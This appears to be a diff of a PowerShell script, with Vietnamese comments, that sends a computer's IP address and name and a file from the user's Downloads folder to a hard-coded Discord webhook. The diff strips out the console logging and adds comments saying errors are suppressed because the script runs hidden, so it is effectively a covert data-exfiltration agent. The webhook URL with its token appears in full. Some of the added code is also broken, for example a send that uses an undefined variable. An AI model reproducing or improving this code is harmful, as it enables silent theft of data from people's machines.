@@ -1,17 +1,12 @@
 $webhookUrl = "https://discord.com/api/webhooks/1487286624411848855/zpDppnQHhm7BJ1BNIm_0zvZNWph8r725gO5SpFTWr9-otXf3uKLvMZ3StJjksTxyU412"
 
-Write-Host "[*] PS: Starting..."
-
-# --- 1. Get IP address (with fallback) ---
+# Lấy IP với fallback
 try {
     $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress[0]
 } catch {
-    $ipAddress = "Unknown"
-    Write-Host "[!] PS: Could not get IP via Get-NetIPAddress: $($_.Exception.Message)"
+    $ipAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -and $_.IPAddress -ne $null }).IPAddress[0]
 }
-
-# --- 2. Build embed JSON (valid for Discord) ---
-$embedData = @{
+$embedHash = @{
     content = "🚀 **Agent Debug Mode**"
     embeds = @(
         @{
@@ -26,77 +21,24 @@ $embedData = @{
     )
 }
 
-$embedJson = $embedData | ConvertTo-Json -Depth 5
-Write-Host "[DEBUG] Embed JSON to be sent:"
-Write-Host $embedJson
-
-# --- 3. Send embed (JSON only) ---
 try {
-    Write-Host "[*] PS: Sending embed to Discord..."
-    $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $embedJson -ContentType "application/json"
-    Write-Host "[+] PS: Embed sent successfully. Response: $($response | ConvertTo-Json)"
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($embedHash | ConvertTo-Json -Depth 5) -ContentType "application/json"
+    Write-Host "[+] Embed sent"
 } catch {
-    Write-Host "[-] PS: Failed to send embed: $($_.Exception.Message)"
-    if ($_.Exception.Response) {
-        $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
-        $reader.BaseStream.Position = 0
-        $reader.DiscardBufferedData()
-        $responseBody = $reader.ReadToEnd()
-        Write-Host "[-] Detailed error from Discord: $responseBody"
-    }
+    Write-Host "[-] Embed failed: $_"
+    # In chi tiết lỗi như cũ
+}
+# Gửi embed (bắt lỗi nếu webhook chết)
+try {
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $embed -ContentType "application/json"
+} catch {
+    # Không hiện lỗi ra console (vì chạy ẩn)
 }
 
-# --- 4. Prepare file upload (proper multipart with attachment metadata) ---
+# Gửi file abc.txt nếu có
 $filePath = Join-Path ([Environment]::GetFolderPath('UserProfile')) "Downloads\abc.txt"
-Write-Host "[*] PS: Checking file at: $filePath"
-
 if (Test-Path $filePath) {
-    Write-Host "[*] PS: File found. Size: $((Get-Item $filePath).Length) bytes"
-
-    # Build the JSON payload that will be sent as the "payload_json" part.
-    # It references the file with id 0 and the real filename.
-    $payloadJson = @{
-        content = "File attached from $env:COMPUTERNAME"
-        attachments = @(
-            @{
-                id = 0
-                filename = "abc.txt"
-            }
-        )
-    } | ConvertTo-Json
-
     try {
-        # Create multipart form data using .NET classes
-        $multipartContent = [System.Net.Http.MultipartFormDataContent]::new()
-
-        # Part 1: payload_json (the metadata)
-        $jsonContent = [System.Net.Http.StringContent]::new($payloadJson, [System.Text.Encoding]::UTF8, "application/json")
-        $multipartContent.Add($jsonContent, "payload_json")
-
-        # Part 2: the actual file, key must be "files[0]"
-        $fileStream = [System.IO.File]::OpenRead($filePath)
-        $fileContent = [System.Net.Http.StreamContent]::new($fileStream)
-        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
-        $multipartContent.Add($fileContent, "files[0]", "abc.txt")
-
-        # Send the request
-        $httpClient = [System.Net.Http.HttpClient]::new()
-        Write-Host "[*] PS: Uploading file with multipart..."
-        $response = $httpClient.PostAsync($webhookUrl, $multipartContent).Result
-
-        if ($response.IsSuccessStatusCode) {
-            Write-Host "[+] PS: File uploaded successfully!"
-        } else {
-            $errBody = $response.Content.ReadAsStringAsync().Result
-            Write-Host "[-] PS: Upload failed. Status: $($response.StatusCode) - $errBody"
-        }
-    } catch {
-        Write-Host "[-] PS: Exception during upload: $($_.Exception.Message)"
-    } finally {
-        if ($fileStream) { $fileStream.Dispose() }
-        if ($httpClient) { $httpClient.Dispose() }
-        if ($multipartContent) { $multipartContent.Dispose() }
-    }
-} else {
-    Write-Host "[!] PS: File not found at $filePath"
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -InFile $filePath -ContentType "multipart/form-data"
+    } catch {}
 }
